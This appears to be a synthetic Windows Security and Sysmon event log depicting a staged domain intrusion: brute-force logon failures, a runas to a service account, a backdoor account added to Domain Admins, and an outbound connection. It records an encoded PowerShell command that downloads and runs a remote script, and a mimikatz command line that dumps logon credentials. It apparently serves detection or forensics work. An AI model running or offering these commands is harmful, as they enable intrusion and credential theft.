<?xml version="1.0" encoding="UTF-8"?>
<Events>
  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
      <EventID>4624</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>12544</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2026-02-07T08:05:22.123456789Z"/>
      <EventRecordID>123456</EventRecordID>
      <Correlation ActivityID="{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}"/>
      <Execution ProcessID="612" ThreadID="1020"/>
      <Channel>Security</Channel>
      <Computer>WORKSTATION01.corp.example.com</Computer>
      <Security/>
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-18</Data>
      <Data Name="SubjectUserName">WORKSTATION01$</Data>
      <Data Name="SubjectDomainName">CORP</Data>
      <Data Name="SubjectLogonId">0x3e7</Data>
      <Data Name="TargetUserSid">S-1-5-21-1234567890-0987654321-1122334455-1001</Data>
      <Data Name="TargetUserName">jsmith</Data>
      <Data Name="TargetDomainName">CORP</Data>
      <Data Name="TargetLogonId">0x12345678</Data>
      <Data Name="LogonType">10</Data>
      <Data Name="LogonProcessName">User32</Data>
      <Data Name="AuthenticationPackageName">Negotiate</Data>
      <Data Name="WorkstationName">WORKSTATION01</Data>
      <Data Name="LogonGuid">{B1C2D3E4-F5A6-7890-BCDE-F12345678901}</Data>
      <Data Name="TransmittedServices">-</Data>
      <Data Name="LmPackageName">-</Data>
      <Data Name="KeyLength">0</Data>
      <Data Name="ProcessId">0x1234</Data>
      <Data Name="ProcessName">C:\Windows\System32\svchost.exe</Data>
      <Data Name="IpAddress">192.168.1.50</Data>
      <Data Name="IpPort">52890</Data>
      <Data Name="ImpersonationLevel">%%1833</Data>
      <Data Name="RestrictedAdminMode">-</Data>
      <Data Name="TargetOutboundUserName">-</Data>
      <Data Name="TargetOutboundDomainName">-</Data>
      <Data Name="VirtualAccount">%%1843</Data>
      <Data Name="TargetLinkedLogonId">0x0</Data>
      <Data Name="ElevatedToken">%%1842</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
      <EventID>4625</EventID>
      <Version>0</Version>
      <Level>0</Level>
      <Task>12544</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8010000000000000</Keywords>
      <TimeCreated SystemTime="2026-02-07T08:10:33.456789012Z"/>
      <EventRecordID>123457</EventRecordID>
      <Correlation/>
      <Execution ProcessID="612" ThreadID="1024"/>
      <Channel>Security</Channel>
      <Computer>DC01.corp.example.com</Computer>
      <Security/>
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-0-0</Data>
      <Data Name="SubjectUserName">-</Data>
      <Data Name="SubjectDomainName">-</Data>
      <Data Name="SubjectLogonId">0x0</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">administrator</Data>
      <Data Name="TargetDomainName">CORP</Data>
      <Data Name="Status">0xc000006d</Data>
      <Data Name="FailureReason">%%2313</Data>
      <Data Name="SubStatus">0xc000006a</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="LogonProcessName">NtLmSsp</Data>
      <Data Name="AuthenticationPackageName">NTLM</Data>
      <Data Name="WorkstationName">ATTACKER</Data>
      <Data Name="TransmittedServices">-</Data>
      <Data Name="LmPackageName">-</Data>
      <Data Name="KeyLength">0</Data>
      <Data Name="ProcessId">0x0</Data>
      <Data Name="ProcessName">-</Data>
      <Data Name="IpAddress">185.234.72.15</Data>
      <Data Name="IpPort">44521</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
      <EventID>4625</EventID>
      <Version>0</Version>
      <Level>0</Level>
      <Task>12544</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8010000000000000</Keywords>
      <TimeCreated SystemTime="2026-02-07T08:10:35.567890123Z"/>
      <EventRecordID>123458</EventRecordID>
      <Correlation/>
      <Execution ProcessID="612" ThreadID="1024"/>
      <Channel>Security</Channel>
      <Computer>DC01.corp.example.com</Computer>
      <Security/>
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-0-0</Data>
      <Data Name="SubjectUserName">-</Data>
      <Data Name="SubjectDomainName">-</Data>
      <Data Name="SubjectLogonId">0x0</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">admin</Data>
      <Data Name="TargetDomainName">CORP</Data>
      <Data Name="Status">0xc000006d</Data>
      <Data Name="FailureReason">%%2313</Data>
      <Data Name="SubStatus">0xc0000064</Data>
      <Data Name="LogonType">3</Data>
      <Data Name="LogonProcessName">NtLmSsp</Data>
      <Data Name="AuthenticationPackageName">NTLM</Data>
      <Data Name="WorkstationName">ATTACKER</Data>
      <Data Name="TransmittedServices">-</Data>
      <Data Name="LmPackageName">-</Data>
      <Data Name="KeyLength">0</Data>
      <Data Name="ProcessId">0x0</Data>
      <Data Name="ProcessName">-</Data>
      <Data Name="IpAddress">185.234.72.15</Data>
      <Data Name="IpPort">44522</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
      <EventID>4648</EventID>
      <Version>0</Version>
      <Level>0</Level>
      <Task>12544</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2026-02-07T08:30:15.789012345Z"/>
      <EventRecordID>123460</EventRecordID>
      <Correlation/>
      <Execution ProcessID="612" ThreadID="1028"/>
      <Channel>Security</Channel>
      <Computer>WORKSTATION01.corp.example.com</Computer>
      <Security/>
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-1234567890-0987654321-1122334455-1001</Data>
      <Data Name="SubjectUserName">jsmith</Data>
      <Data Name="SubjectDomainName">CORP</Data>
      <Data Name="SubjectLogonId">0x12345678</Data>
      <Data Name="LogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name="TargetUserName">svc_admin</Data>
      <Data Name="TargetDomainName">CORP</Data>
      <Data Name="TargetLogonGuid">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name="TargetServerName">DC01.corp.example.com</Data>
      <Data Name="TargetInfo">DC01.corp.example.com</Data>
      <Data Name="ProcessId">0x5678</Data>
      <Data Name="ProcessName">C:\Windows\System32\runas.exe</Data>
      <Data Name="IpAddress">192.168.1.10</Data>
      <Data Name="IpPort">0</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
      <EventID>4672</EventID>
      <Version>0</Version>
      <Level>0</Level>
      <Task>12548</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2026-02-07T08:35:22.012345678Z"/>
      <EventRecordID>123461</EventRecordID>
      <Correlation/>
      <Execution ProcessID="612" ThreadID="1032"/>
      <Channel>Security</Channel>
      <Computer>DC01.corp.example.com</Computer>
      <Security/>
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-1234567890-0987654321-1122334455-500</Data>
      <Data Name="SubjectUserName">Administrator</Data>
      <Data Name="SubjectDomainName">CORP</Data>
      <Data Name="SubjectLogonId">0xABCDEF01</Data>
      <Data Name="PrivilegeList">SeSecurityPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeTakeOwnershipPrivilege
SeDebugPrivilege
SeSystemEnvironmentPrivilege
SeLoadDriverPrivilege
SeImpersonatePrivilege
SeDelegateSessionUserImpersonatePrivilege
SeEnableDelegationPrivilege</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
      <EventID>4688</EventID>
      <Version>2</Version>
      <Level>0</Level>
      <Task>13312</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2026-02-07T08:40:15.234567890Z"/>
      <EventRecordID>123462</EventRecordID>
      <Correlation/>
      <Execution ProcessID="4" ThreadID="88"/>
      <Channel>Security</Channel>
      <Computer>WORKSTATION01.corp.example.com</Computer>
      <Security/>
    </System>
    <EventData>
      <Data Name="SubjectUserSid">S-1-5-21-1234567890-0987654321-1122334455-1001</Data>
      <Data Name="SubjectUserName">jsmith</Data>
      <Data Name="SubjectDomainName">CORP</Data>
      <Data Name="SubjectLogonId">0x12345678</Data>
      <Data Name="NewProcessId">0x9ABC</Data>
      <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="TokenElevationType">%%1936</Data>
      <Data Name="ProcessId">0x5678</Data>
      <Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMwA1AC8AcwB0AGEAZwBlADIALgBwAHMAMQAnACkA</Data>
      <Data Name="TargetUserSid">S-1-0-0</Data>
      <Data Name="TargetUserName">-</Data>
      <Data Name="TargetDomainName">-</Data>
      <Data Name="TargetLogonId">0x0</Data>
      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
      <Data Name="MandatoryLabel">S-1-16-12288</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
      <EventID>4720</EventID>
      <Version>0</Version>
      <Level>0</Level>
      <Task>13824</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2026-02-07T08:55:12.345678901Z"/>
      <EventRecordID>123463</EventRecordID>
      <Correlation/>
      <Execution ProcessID="612" ThreadID="1036"/>
      <Channel>Security</Channel>
      <Computer>DC01.corp.example.com</Computer>
      <Security/>
    </System>
    <EventData>
      <Data Name="TargetUserName">backdoor</Data>
      <Data Name="TargetDomainName">CORP</Data>
      <Data Name="TargetSid">S-1-5-21-1234567890-0987654321-1122334455-1337</Data>
      <Data Name="SubjectUserSid">S-1-5-21-1234567890-0987654321-1122334455-1001</Data>
      <Data Name="SubjectUserName">jsmith</Data>
      <Data Name="SubjectDomainName">CORP</Data>
      <Data Name="SubjectLogonId">0x12345678</Data>
      <Data Name="PrivilegeList">-</Data>
      <Data Name="SamAccountName">backdoor</Data>
      <Data Name="DisplayName">-</Data>
      <Data Name="UserPrincipalName">backdoor@corp.example.com</Data>
      <Data Name="HomeDirectory">-</Data>
      <Data Name="HomePath">-</Data>
      <Data Name="ScriptPath">-</Data>
      <Data Name="ProfilePath">-</Data>
      <Data Name="UserWorkstations">-</Data>
      <Data Name="PasswordLastSet">%%1793</Data>
      <Data Name="AccountExpires">%%1794</Data>
      <Data Name="PrimaryGroupId">513</Data>
      <Data Name="AllowedToDelegateTo">-</Data>
      <Data Name="OldUacValue">0x0</Data>
      <Data Name="NewUacValue">0x15</Data>
      <Data Name="UserAccountControl">%%2080 %%2082 %%2084</Data>
      <Data Name="UserParameters">-</Data>
      <Data Name="SidHistory">-</Data>
      <Data Name="LogonHours">%%1793</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}"/>
      <EventID>4732</EventID>
      <Version>0</Version>
      <Level>0</Level>
      <Task>13826</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8020000000000000</Keywords>
      <TimeCreated SystemTime="2026-02-07T08:55:18.456789012Z"/>
      <EventRecordID>123464</EventRecordID>
      <Correlation/>
      <Execution ProcessID="612" ThreadID="1040"/>
      <Channel>Security</Channel>
      <Computer>DC01.corp.example.com</Computer>
      <Security/>
    </System>
    <EventData>
      <Data Name="MemberName">CN=backdoor,CN=Users,DC=corp,DC=example,DC=com</Data>
      <Data Name="MemberSid">S-1-5-21-1234567890-0987654321-1122334455-1337</Data>
      <Data Name="TargetUserName">Domain Admins</Data>
      <Data Name="TargetDomainName">CORP</Data>
      <Data Name="TargetSid">S-1-5-21-1234567890-0987654321-1122334455-512</Data>
      <Data Name="SubjectUserSid">S-1-5-21-1234567890-0987654321-1122334455-1001</Data>
      <Data Name="SubjectUserName">jsmith</Data>
      <Data Name="SubjectDomainName">CORP</Data>
      <Data Name="SubjectLogonId">0x12345678</Data>
      <Data Name="PrivilegeList">-</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2026-02-07T09:00:33.567890123Z"/>
      <EventRecordID>789012</EventRecordID>
      <Correlation/>
      <Execution ProcessID="2876" ThreadID="3456"/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WORKSTATION01.corp.example.com</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="RuleName">technique_id=T1003,technique_name=Credential Dumping</Data>
      <Data Name="UtcTime">2026-02-07 09:00:33.567</Data>
      <Data Name="ProcessGuid">{A1B2C3D4-5678-90AB-CDEF-123456789012}</Data>
      <Data Name="ProcessId">9876</Data>
      <Data Name="Image">C:\Windows\Temp\mimikatz.exe</Data>
      <Data Name="FileVersion">2.2.0</Data>
      <Data Name="Description">mimikatz</Data>
      <Data Name="Product">mimikatz</Data>
      <Data Name="Company">gentilkiwi</Data>
      <Data Name="OriginalFileName">mimikatz.exe</Data>
      <Data Name="CommandLine">"C:\Windows\Temp\mimikatz.exe" "privilege::debug" "sekurlsa::logonpasswords" "exit"</Data>
      <Data Name="CurrentDirectory">C:\Windows\Temp\</Data>
      <Data Name="User">CORP\jsmith</Data>
      <Data Name="LogonGuid">{A1B2C3D4-5678-90AB-CDEF-123456789013}</Data>
      <Data Name="LogonId">0x12345678</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA256=A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2</Data>
      <Data Name="ParentProcessGuid">{A1B2C3D4-5678-90AB-CDEF-123456789014}</Data>
      <Data Name="ParentProcessId">5432</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\Windows\System32\cmd.exe"</Data>
      <Data Name="ParentUser">CORP\jsmith</Data>
    </EventData>
  </Event>

  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
    <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"/>
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2026-02-07T09:05:45.678901234Z"/>
      <EventRecordID>789013</EventRecordID>
      <Correlation/>
      <Execution ProcessID="2876" ThreadID="3456"/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WORKSTATION01.corp.example.com</Computer>
      <Security UserID="S-1-5-18"/>
    </System>
    <EventData>
      <Data Name="RuleName">technique_id=T1071,technique_name=Application Layer Protocol</Data>
      <Data Name="UtcTime">2026-02-07 09:05:45.678</Data>
      <Data Name="ProcessGuid">{A1B2C3D4-5678-90AB-CDEF-123456789015}</Data>
      <Data Name="ProcessId">7654</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="User">CORP\jsmith</Data>
      <Data Name="Protocol">tcp</Data>
      <Data Name="Initiated">true</Data>
      <Data Name="SourceIsIpv6">false</Data>
      <Data Name="SourceIp">192.168.1.100</Data>
      <Data Name="SourceHostname">WORKSTATION01.corp.example.com</Data>
      <Data Name="SourcePort">54321</Data>
      <Data Name="SourcePortName">-</Data>
      <Data Name="DestinationIsIpv6">false</Data>
      <Data Name="DestinationIp">185.220.101.35</Data>
      <Data Name="DestinationHostname">-</Data>
      <Data Name="DestinationPort">443</Data>
      <Data Name="DestinationPortName">https</Data>
    </EventData>
  </Event>
</Events>
